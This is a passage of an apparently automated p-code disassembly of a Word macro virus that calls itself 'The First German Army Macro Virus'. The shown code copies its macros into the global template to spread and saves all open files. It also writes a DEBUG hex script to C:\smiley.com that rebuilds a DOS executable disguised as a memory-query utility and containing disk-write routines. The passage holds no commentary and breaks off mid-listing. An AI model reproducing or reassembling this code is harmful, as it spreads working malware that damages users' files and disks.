' 	ArgsMemCall MacroCopy 0x0003 
' Line #23:
' 	LitStr 0x000B "Global:Joke"
' 	Ld WordBasic 
' 	ArgsMemLd [FileName$] 0x0000 
' 	LitStr 0x0004 "Joke"
' 	Add 
' 	LitDI2 0x0001 
' 	Ld WordBasic 
' 	ArgsMemCall MacroCopy 0x0003 
' Line #24:
' 	LitDI2 0x0001 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall FileSaveAll 0x0002 
' Line #25:
' 	EndIfBlock 
' Line #26:
' 	ArgsLd Rnd 0x0000 
' 	LitDI2 0x0064 
' 	Mul 
' 	Ld WordBasic 
' 	ArgsMemLd InStrB 0x0001 
' 	St aa 
' Line #27:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld aa 
' 	For 
' Line #28:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #29:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #30:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #31:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #32:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #33:
' 	Ld WordBasic 
' 	ArgsMemCall Beep 0x0000 
' Line #34:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #35:
' 	LitStr 0x0022 " The First German Army Macro Virus"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #36:
' 	LitStr 0x0015 " Created by Cool Zero"
' 	Ld WordBasic 
' 	ArgsMemCall MsgBox 0x0001 
' Line #37:
' 	EndSub 
' Macros/VBA/TFGAMV - 21860 bytes
' Line #0:
' Line #1:
' 	FuncDefn (Public Sub MAIN())
' Line #2:
' 	Reparse 0x0007 "Dim As#"
' Line #3:
' 	Reparse 0x000A "Dim Close#"
' Line #4:
' 	Reparse 0x000A "Dim Print#"
' Line #5:
' 	Dim 
' 	VarDefn setattr_
' Line #6:
' 	OnError <crash> 
' 	BoS 0x0000 
' 	OnError NoDropper 
' Line #7:
' 	Ld WordBasic 
' 	ArgsMemLd Now 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd Hour 0x0001 
' 	LitDI2 0x0005 
' 	LitDI2 0x000C 
' 	Add 
' 	Ne 
' 	IfBlock 
' Line #8:
' 	GoTo NoDropper 
' Line #9:
' 	LitStr 0x000E "C:\Command.com"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Input)
' Line #10:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #11:
' 	LitStr 0x000D "C:\smiley.com"
' 	LitDI2 0x0001 
' 	LitDefault 
' 	Open (For Output)
' Line #12:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000C "N Smiley.com"
' 	PrintItemNL 
' Line #13:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0100 E9 FD 02 0D 46 72 65 65 20 4D 65 6D 6F 72 79 20"
' 	PrintItemNL 
' Line #14:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0110 51 75 65 72 79 20 50 72 6F 67 72 61 6D 2C 20 56"
' 	PrintItemNL 
' Line #15:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0120 65 72 73 69 6F 6E 20 34 2E 30 33 0D 0A 53 4D 47"
' 	PrintItemNL 
' Line #16:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0130 20 53 6F 66 74 77 61 72 65 0D 0A 28 43 29 20 43"
' 	PrintItemNL 
' Line #17:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0140 6F 70 79 72 69 67 68 74 20 31 39 38 36 2C 31 39"
' 	PrintItemNL 
' Line #18:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0150 38 37 20 53 74 65 76 65 6E 20 4D 2E 20 47 65 6F"
' 	PrintItemNL 
' Line #19:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0160 72 67 69 61 64 65 73 0D 0A 1A 00 00 00 00 00 00"
' 	PrintItemNL 
' Line #20:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0170 00 00 45 4D 4D 58 58 58 58 30 45 78 70 61 6E 64"
' 	PrintItemNL 
' Line #21:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0180 65 64 20 4D 65 6D 6F 72 79 20 4D 61 6E 61 67 65"
' 	PrintItemNL 
' Line #22:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0190 72 20 45 72 72 6F 72 21 07 0D 0A 24 31 30 30 2E"
' 	PrintItemNL 
' Line #23:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01A0 30 CD 12 BA 40 00 F7 E2 A3 70 01 BA 10 00 F7 E2"
' 	PrintItemNL 
' Line #24:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01B0 BF 27 03 E8 55 01 E8 14 01 B4 09 BA 1F 03 CD 21"
' 	PrintItemNL 
' Line #25:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01C0 06 8C C8 48 8E C0 26 A1 03 00 A3 6C 01 07 BB 10"
' 	PrintItemNL 
' Line #26:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01D0 00 7F E3 8B CA 8B D8 BF 45 03 E8 2E 01 E8 ED 00"
' 	PrintItemNL 
' Line #27:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01E0 A1 6C 01 BB 64 00 F7 E3 8B 1E 70 01 F7 F3 BF 60"
' 	PrintItemNL 
' Line #28:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 01F0 03 E8 F1 00 E8 D6 00 8B C2 BB 64 00 F7 E3 8B 1E"
' 	PrintItemNL 
' Line #29:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0200 70 01 F7 F3 BF 63 03 E8 DB 00 B4 09 BA 3D 03 CD"
' 	PrintItemNL 
' Line #30:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0210 21 B4 88 CD 15 72 19 0B C0 74 15 BB 00 04 F7 E3"
' 	PrintItemNL 
' Line #31:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0220 BF 70 03 E8 E5 00 E8 A4 00 B4 09 BA 68 03 CD 21"
' 	PrintItemNL 
' Line #32:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0230 06 B8 67 35 CD 21 BF 0A 00 BE 72 01 B9 08 00 FC"
' 	PrintItemNL 
' Line #33:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0240 F3 A6 07 75 77 B4 42 CD 67 0A E4 75 74 89 16 6E"
' 	PrintItemNL 
' Line #34:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0250 01 89 1E 6A 01 B8 00 40 F7 E2 BF 9A 03 E8 AB 00"
' 	PrintItemNL 
' Line #35:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0260 E8 6A 00 B4 09 BA 92 03 CD 21 B8 00 40 F7 E3 BF"
' 	PrintItemNL 
' Line #36:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0270 C8 03 E8 96 00 E8 55 00 A1 6A 01 3B 06 6E 01 75"
' 	PrintItemNL 
' Line #37:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0280 0D BF F1 03 BE 9C 01 B9 05 00 F3 A4 EB 27 BB 64"
' 	PrintItemNL 
' Line #38:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0290 00 F7 E3 8B 1E 6E 01 F7 F3 BF F3 03 E8 46 00 E8"
' 	PrintItemNL 
' Line #39:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02A0 2B 00 8B C2 BB 64 00 F7 E3 8B 1E 6E 01 F7 F3 BF"
' 	PrintItemNL 
' Line #40:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02B0 F6 03 E8 30 00 B4 09 BA C0 03 CD 21 B8 00 4C CD"
' 	PrintItemNL 
' Line #41:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02C0 21 B4 09 BA 7A 01 CD 21 B8 01 4C CD 21 80 3D 30"
' 	PrintItemNL 
' Line #42:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02D0 75 12 80 7D 01 30 7C 0C 80 7D 01 39 7F 06 C6 05"
' 	PrintItemNL 
' Line #43:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02E0 20 47 EB E9 C3 50 53 32 E4 B3 0A F6 F3 05 30 30"
' 	PrintItemNL 
' Line #44:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 02F0 83 EF 02 89 05 5B 58 C3 50 53 B3 64 F6 F3 86 E0"
' 	PrintItemNL 
' Line #45:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0300 E8 E2 FF 86 E0 E8 DD FF 5B 58 C3 50 53 52 BB 10"
' 	PrintItemNL 
' Line #46:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0310 27 F7 F3 92 E8 E1 FF 92 E8 DD FF 5A 5B 58 C3 20"
' 	PrintItemNL 
' Line #47:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0320 20 20 20 20 20 20 30 20 42 79 74 65 73 20 54 6F"
' 	PrintItemNL 
' Line #48:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0330 74 61 6C 20 4D 65 6D 6F 72 79 0D 0A 24 20 20 20"
' 	PrintItemNL 
' Line #49:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0340 20 20 20 20 30 20 42 79 74 65 73 20 41 76 61 69"
' 	PrintItemNL 
' Line #50:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0350 6C 61 62 6C 65 20 4D 65 6D 6F 72 79 20 28 20 30"
' 	PrintItemNL 
' Line #51:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0360 2E 30 30 25 29 0D 0A 24 20 20 20 20 20 20 20 30"
' 	PrintItemNL 
' Line #52:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0370 20 42 79 74 65 73 20 6F 66 20 45 78 74 65 6E 64"
' 	PrintItemNL 
' Line #53:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0380 65 64 20 4D 65 6D 6F 72 79 20 54 6F 74 61 6C 0D"
' 	PrintItemNL 
' Line #54:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0390 0A 24 20 20 20 20 20 20 20 30 20 42 79 74 65 73"
' 	PrintItemNL 
' Line #55:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03A0 20 6F 66 20 4C 49 4D 20 45 78 70 61 6E 64 65 64"
' 	PrintItemNL 
' Line #56:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03B0 20 4D 65 6D 6F 72 79 20 54 6F 74 61 6C 0D 0A 24"
' 	PrintItemNL 
' Line #57:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03C0 20 20 20 20 20 20 20 30 20 42 79 74 65 73 20 6F"
' 	PrintItemNL 
' Line #58:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03D0 66 20 4C 49 4D 20 45 78 70 61 6E 64 65 64 20 4D"
' 	PrintItemNL 
' Line #59:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03E0 65 6D 6F 72 79 20 41 76 61 69 6C 61 62 6C 65 20"
' 	PrintItemNL 
' Line #60:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 03F0 28 20 30 2E 30 30 25 29 0D 0A 24 03 47 01 2E C7"
' 	PrintItemNL 
' Line #61:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0400 51 1E 06 8C C8 05 30 00 2D 00 00 8E D8 8E C0 A3"
' 	PrintItemNL 
' Line #62:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0410 38 03 A0 33 07 A2 34 07 B0 00 A2 33 07 A0 36 07"
' 	PrintItemNL 
' Line #63:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0420 A2 37 07 A1 02 08 A3 08 08 A1 04 08 A3 0A 08 A1"
' 	PrintItemNL 
' Line #64:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0430 06 08 A3 0C 08 B4 2F CD 21 89 1E 3C 07 8C C3 89"
' 	PrintItemNL 
' Line #65:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0440 1E 3E 07 BA 12 08 B4 1A CD 21 B8 00 00 A3 7B 07"
' 	PrintItemNL 
' Line #66:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0450 A3 7D 07 BB DE 03 8B 47 01 A3 A7 07 E8 F3 02 3D"
' 	PrintItemNL 
' Line #67:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0460 00 00 74 03 E9 45 02 A1 0E 08 3D 00 00 75 03 E9"
' 	PrintItemNL 
' Line #68:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0470 07 02 B4 19 CD 21 50 04 41 A2 44 07 58 B4 00 3C"
' 	PrintItemNL 
' Line #69:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0480 02 7D 0B E8 F0 02 3D 00 00 74 03 E9 1E 02 B2 00"
' 	PrintItemNL 
' Line #70:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0490 BE 47 07 89 36 79 07 B4 47 CD 21 A0 47 07 3C 00"
' 	PrintItemNL 
' Line #71:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04A0 74 13 8C D8 8E C0 B9 C8 00 B8 00 00 BF 44 07 F2"
' 	PrintItemNL 
' Line #72:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04B0 AE 89 3E 79 07 FF 0E 79 07 B0 01 A2 35 07 E8 10"
' 	PrintItemNL 
' Line #73:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04C0 04 A1 7B 07 3D 01 00 74 62 FF 0E 79 07 FE 0E 35"
' 	PrintItemNL 
' Line #74:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04D0 07 E8 FD 03 A1 7B 07 3D 01 00 74 4F E8 8D 03 A1"
' 	PrintItemNL 
' Line #75:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04E0 7D 07 3D 01 00 74 03 E9 8F 01 A1 38 07 8E C0 B9"
' 	PrintItemNL 
' Line #76:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 04F0 C8 00 B8 00 00 BF 44 07 F2 AE 89 3E 79 07 FF 0E"
' 	PrintItemNL 
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0500 79 07 C6 06 35 07 01 90 E8 C6 03 A1 7B 07 3D 01"
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0510 00 74 18 FF 0E 79 07 C6 06 35 07 00 90 E8 B1 03"
' 	PrintItemNL 
' Line #79:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0520 A1 7B 07 3D 01 00 74 03 E9 4E 01 89 1E 9F 07 8B"
' 	PrintItemNL 
' Line #80:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0530 1E 9F 07 B0 00 B4 57 CD 21 89 0E 40 07 89 16 42"
' 	PrintItemNL 
' Line #81:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0540 07 FF 0E 0E 08 A0 35 07 A2 36 07 3C 01 75 44 BB"
' 	PrintItemNL 
' Line #82:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0550 08 01 B8 00 00 89 47 01 B8 FF FF 2D DE 03 2B 06"
' 	PrintItemNL 
' Line #83:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0560 A9 07 2B 06 3A 07 05 01 01 03 06 A2 07 BB DE 03"
' 	PrintItemNL 
' Line #84:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0570 89 47 01 A1 A9 07 BB 05 01 8B C8 81 E1 0F 00 D1"
' 	PrintItemNL 
' Line #85:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0580 E8 D1 E8 D1 E8 D1 E8 83 F9 00 74 01 40 89 47 01"
' 	PrintItemNL 
' Line #86:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0590 E9 98 00 BB 05 01 B8 00 00 89 47 01 BB 08 01 B8"
' 	PrintItemNL 
' Line #87:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05A0 10 00 89 47 01 8B 1E 9F 07 B0 00 B9 00 00 8B D1"
' 	PrintItemNL 
' Line #88:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05B0 B4 42 CD 21 B9 20 00 BA E2 07 B4 3F CD 21 BB E2"
' 	PrintItemNL 
' Line #89:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05C0 07 8B 47 14 A3 02 08 8B 47 16 A3 04 08 A1 AB 07"
' 	PrintItemNL 
' Line #90:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05D0 2B 06 EA 07 8B 1E 3A 07 83 FB 00 74 01 40 A3 F8"
' 	PrintItemNL 
' Line #91:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05E0 07 A3 06 08 B8 00 00 A3 F6 07 FF 06 E6 07 FF 06"
' 	PrintItemNL 
' Line #92:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 05F0 E6 07 FF 06 E6 07 B8 00 02 2B 06 E4 07 BB BF 01"
' 	PrintItemNL 
' Line #93:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0600 90 3B C3 7F 04 FF 06 E6 07 8B 1E 9F 07 B0 00 B9"
' 	PrintItemNL 
' Line #94:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0610 00 00 8B D1 B4 42 CD 21 8B 1E 9F 07 B9 20 00 A1"
' 	PrintItemNL 
' Line #95:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0620 38 07 8E D8 BA E2 07 B4 40 CD 21 8B 1E 9F 07 B0"
' 	PrintItemNL 
' Line #96:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0630 02 B9 00 00 8B D1 B4 42 CD 21 8B 1E 9F 07 8B 0E"
' 	PrintItemNL 
' Line #97:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0640 3A 07 A1 38 07 8E D8 B4 40 CD 21 B9 BF 07 90 BA"
' 	PrintItemNL 
' Line #98:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0650 00 01 B4 40 CD 21 A0 35 07 3C 00 74 03 E8 33 01"
' 	PrintItemNL 
' Line #99:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0660 B0 01 8B 0E 40 07 8B 16 42 07 B4 57 CD 21 8B 1E"
' 	PrintItemNL 
' Line #100:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0670 9F 07 B4 3E CD 21 EB 34 90 E8 A8 00 3D 01 00 75"
' 	PrintItemNL 
' Line #101:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0680 2B E8 8E 00 8E C0 26 A0 00 00 3C EB 74 1E BE 00"
' 	PrintItemNL 
' Line #102:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0690 00 BB 5E 06 8B 07 26 89 04 46 43 81 FB 2A 07 72"
' 	PrintItemNL 
' Line #103:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06A0 F3 1E 8C C3 E8 51 00 1F 8C D8 8E C0 1E 8B 16 3C"
' 	PrintItemNL 
' Line #104:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06B0 07 8E 1E 3E 07 B4 1A CD 21 1F A0 34 07 3C 01 75"
' 	PrintItemNL 
' Line #105:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06C0 04 B4 4C CD 21 A0 37 07 3C 00 74 15 A1 A7 07 BB"
' 	PrintItemNL 
' Line #106:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06D0 DE 03 89 47 01 8C C8 8E D8 8E C0 07 1F 59 E9 C0"
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06E0 FA 8C C8 2B 06 0C 08 01 06 0A 08 BB 08 08 81 EB"
' 	PrintItemNL 
' Line #108:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 06F0 00 01 07 1F 59 2E FF 2F 53 B0 1C B4 35 CD 21 BE"
' 	PrintItemNL 
' Line #109:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0700 0E 00 1F 89 1C 8C 44 02 BA 00 00 B0 1C B4 25 CD"
' 	PrintItemNL 
' Line #110:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0710 21 C3 CD 12 2D 28 00 D1 E0 D1 E0 D1 E0 D1 E0 D1"
' 	PrintItemNL 
' Line #111:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0720 E0 D1 E0 C3 B4 2A CD 21 3B 0E 2C 07 72 20 7F 0E"
' 	PrintItemNL 
' Line #112:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0730 3A 36 2B 07 72 18 7F 06 3A 16 2A 07 72 10 B4 2C"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0740 CD 21 3A 16 32 07 72 06 B8 01 00 EB 04 90 B8 00"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0750 00 C3 B4 2A CD 21 3B 0E 30 07 72 16 7F 0E 3A 36"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0760 2F 07 72 0E 7F 06 3A 16 2E 07 72 06 B8 01 00 EB"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0770 04 90 B8 00 00 C3 50 BA 14 00 B9 01 00 BB BF 08"
' 	PrintItemNL 
' Line #117:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0780 CD 25 58 58 CD 26 73 06 B8 01 00 EB 04 90 B8 00"
' 	PrintItemNL 
' Line #118:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0790 00 59 C3 A1 A9 07 2D 03 00 03 06 3A 07 A3 A5 07"
' 	PrintItemNL 
' Line #119:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07A0 8B 1E 9F 07 B0 00 B9 00 00 8B D1 B4 42 CD 21 8B"
' 	PrintItemNL 
' Line #120:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07B0 1E 9F 07 B9 03 00 A1 38 07 8E D8 BA A4 07 B4 40"
' 	PrintItemNL 
' Line #121:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07C0 CD 21 C3 51 56 B0 02 B4 3D CD 21 8B D8 A0 35 07"
' 	PrintItemNL 
' Line #122:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07D0 3C 01 75 1F B0 00 B9 00 00 8B D1 B4 42 CD 21 B9"
' 	PrintItemNL 
' Line #123:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07E0 03 00 BA A1 07 B4 3F CD 21 A0 A1 07 3C E9 74 03"
' 	PrintItemNL 
' Line #124:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 07F0 EB 66 90 B0 02 B9 00 00 8B D1 B4 42 CD 21 52 50"
' 	PrintItemNL 
' Line #125:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0800 A3 A9 07 F7 D0 40 25 0F 00 A3 3A 07 A1 A9 07 D1"
' 	PrintItemNL 
' Line #126:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0810 DA D1 D8 D1 DA D1 D8 D1 DA D1 D8 D1 DA D1 D8 A3"
' 	PrintItemNL 
' Line #127:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0820 AB 07 58 5A 8B CA 8B D0 4A 4A 4A B0 00 B4 42 CD"
' 	PrintItemNL 
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0830 21 B9 03 00 BA 62 05 B4 3F CD 21 B8 00 00 BE 62"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0840 05 8A 0C 80 F9 49 75 17 8A 4C 01 80 F9 50 75 0F"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0850 8A 4C 02 80 F9 52 75 07 B4 3F CD 21 B8 01 00 5E"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0860 59 C3 0D 0A 24 00 00 00 00 00 00 00 A1 38 07 8E"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0036 "E 0870 C0 B9 04 00 BE 94 07 8B 3E 79 07 F3 A4 A1 38 07"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
